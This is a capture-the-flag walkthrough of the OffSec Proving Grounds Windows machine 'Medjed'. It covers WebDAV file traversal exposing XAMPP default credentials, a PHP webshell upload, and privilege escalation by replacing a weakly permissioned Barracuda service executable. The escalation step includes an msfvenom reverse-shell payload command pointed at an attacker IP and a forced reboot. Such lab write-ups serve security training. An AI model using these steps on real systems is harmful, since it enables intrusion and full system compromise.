# Medjed — OffSec Proving Grounds Walkthrough

**Platform:** Proving Grounds Practice
**Difficulty:** Intermediate
**OS:** Windows

---

## TL;DR

Barracuda WebDAV on port 8000 reveals XAMPP defaults → Directory brute-forcing uncovers `phpinfo.php` and webroot → WebDAV upload of PHP webshell → `jerren` user shell → Privilege escalation via vulnerable Barracuda service file replacement → NT AUTHORITY\SYSTEM.

---

## Enumeration

```bash
nmap -sV -p- 192.168.242.127
```

**Open Ports:**
- **135, 139, 445**: SMB
- **3306**: MySQL (blocked from remote access)
- **8000, 44330**: BarracudaServer.com HTTP (WebDAV enabled)
- **45332, 45443**: Apache HTTP (Quiz App)
- **30021**: FileZilla FTP (Anonymous Login Allowed)

Through anonymous FTP, we can see project files/source code but nothing immediately exploitable.

Investigating **Port 8000 (Barracuda Server)**:
WebDAV is active. Traversing the file system via the web portal, we find `C:\xampp\passwords.txt` containing XAMPP default passwords:
- MySQL: `root` (no password)
- WebDAV: `xampp-dav-unsecure` / `ppmax2011`

Running `gobuster` on port **45443** (Apache):
```bash
gobuster dir -u http://192.168.242.127:45443/ -w /usr/share/wordlists/dirb/common.txt
```
This reveals `/phpinfo.php`. Looking at `phpinfo`, we identify the web root as `C:\xampp\htdocs`.

---

## Exploitation — WebDAV File Upload

Using the WebDAV portal on port 8000 (with no serious authentication required, or the defaults we found), we upload a PHP webshell directly into `C:\xampp\htdocs`.

Execute a base64 encoded reverse shell command through the PHP webshell. We catch a shell as the user **jerren**.

---

## Privilege Escalation — Barracuda Service Exe Replacement

Searching for Barracuda Server exploits, we find an issue with insecure file permissions on the service executable ([EDB-48789](https://www.exploit-db.com/exploits/48789)). 

The service binary `bd.exe` has weak permissions, allowing us to overwrite or replace it. Since the service runs as SYSTEM, replacing it and restarting the server will grant us SYSTEM execution!

1. Generate a reverse shell payload named `bd.exe`:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.206 LPORT=443 -f exe -o bd.exe
```

2. Move the original service executable:
```cmd
mv C:\bd\bd.exe C:\windows\tasks\bd.exe.bak
```

3. Transfer our malicious `bd.exe` to `C:\bd\bd.exe`.

4. Restart the machine to force the service to restart:
```cmd
shutdown /r /f /t 0
```

Wait a few seconds, and your listener catches a shell as **NT AUTHORITY\SYSTEM**. 🎉

---

## Key Takeaways

- **WebDAV portals** are incredibly dangerous. If you can traverse the filesystem (`C:\xampp\passwords.txt`), you can usually write to it (uploading a webshell).
- **`phpinfo()`** is critical for identifying absolute paths to web roots.
- **Insecure Service Executables**: If you can write to the `.exe` of an installed service, simply replace it with a payload and restart the machine (or the service itself) to escalate.

---

*Thanks for reading! Follow for more OffSec walkthrough content.*
